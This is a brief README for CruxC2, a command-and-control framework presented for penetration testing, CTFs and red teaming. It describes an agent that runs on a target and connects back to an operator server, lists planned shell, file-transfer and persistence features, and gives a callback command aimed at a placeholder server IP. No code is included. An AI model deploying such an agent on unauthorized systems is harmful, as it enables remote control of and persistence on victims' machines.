# CruxC2
>If any man will come after me, let him deny himself, and take up his **cross**, and follow me\
> -- Matthew 16:24

CruxC2 is a lightweight C2 Framework for use with Penetration Testing, CTFs, and Red Team engagements. It consists of these three components:
1. CruxAgent: Executed on the target system and connects back to the CruxServer.
2. CruxServer: The middleman for interaction between CruxClient and CruxAgent.
3. CruxClient: Allows the operator to control the CruxAgent by connecting to the CruxServer.

## CruxAgent
CruxAgent is meant to be ran on the target machine. It contains the following features:
- [ ] Interactive shell
- [ ] File upload/download
- [ ] HTTPS/TLS encrypted transport
- [ ] Establish Persistence to avoid re-running exploit
- [ ] Support for Linux and Windows Targets

The CruxAgent's execution syntax:
```
$ cruxagent -h <CRUXSERVER_IP> [-p <CRUXSERVER_PORT>]
```

## Crux

## Disclaimer
This project is for educational or red teaming use in controlled, authorized environments only. Any misuse against unauthorized systems is illegal and strictly discouraged.


